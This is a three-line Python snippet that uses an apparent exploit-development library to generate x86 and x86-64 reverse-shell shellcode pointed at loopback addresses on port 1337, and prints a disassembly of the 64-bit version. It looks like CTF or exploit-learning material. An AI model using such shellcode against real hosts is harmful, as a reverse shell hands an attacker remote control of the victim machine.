import tools

tools.x86_shellcode.shell_reverse('127.1.1.1', 1337)
print(tools.x86_64.disas(tools.x86_64_shellcode.shell_reverse('127.0.0.1', 1337)))
